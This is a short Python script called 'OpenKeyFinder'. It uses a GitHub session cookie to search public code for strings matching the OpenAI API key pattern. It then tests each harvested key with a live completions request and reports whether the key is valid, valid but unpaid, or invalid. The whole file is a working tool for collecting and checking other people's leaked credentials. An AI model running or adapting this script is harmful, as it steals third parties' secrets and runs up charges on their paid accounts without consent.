import requests
import re
import openai

GITHUB_COOKIE_SESION = "" #<---- HERE

print("""
\033[94m 
   ____                   _  __          ______ _           _           
  / __ \                 | |/ /         |  ____(_)         | |          
 | |  | |_ __   ___ _ __ | ' / ___ _   _| |__   _ _ __   __| | ___ _ __ 
 | |  | | '_ \ / _ \ '_ \|  < / _ \ | | |  __| | | '_ \ / _` |/ _ \ '__|
 | |__| | |_) |  __/ | | | . \  __/ |_| | |    | | | | | (_| |  __/ |   
  \____/| .__/ \___|_| |_|_|\_\___|\__, |_|    |_|_| |_|\__,_|\___|_|   
        | |                         __/ |                               
        |_|                        |___/                                    
                                                       twitter: @hck4fun\033[00m
                                """)


regex = r"sk-[a-zA-Z0-9]*T3BlbkFJ[a-zA-Z0-9]*"

cookies = {'user_session': GITHUB_COOKIE_SESION}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'application/json',
}

matches = []
for i in range(1,6):
    params = {'q': f'/{regex}/', 'type': 'code', 'p':i}
    response = requests.get('https://github.com/search', params=params, cookies=cookies, headers=headers)
    matches = matches + re.findall(regex, response.text)

print(f"FOUND:\033[95m {len(matches)} keys\033[00m")

print("Checking API KEYS....")
for match in matches:
    openai.api_key = match
    try:
        response = openai.Completion.create(engine="gpt-3.5-turbo-instruct", prompt="Hello, world!", temperature=0.6)
        print(f"{match}: API key is:\033[92m VALID\033[00m")
    except Exception as e:
        if str(e) == "You exceeded your current quota, please check your plan and billing details.":
            print(f"{match}: API key:\033[93m VALID but not PAID\033[00m")
        elif "Incorrect API key" in str(e):
            print(f"{match}: API key is:\033[91m NOT VALID\033[00m")
        else:
            #print(str(e))
            print(f"{match}: Unkwon error")
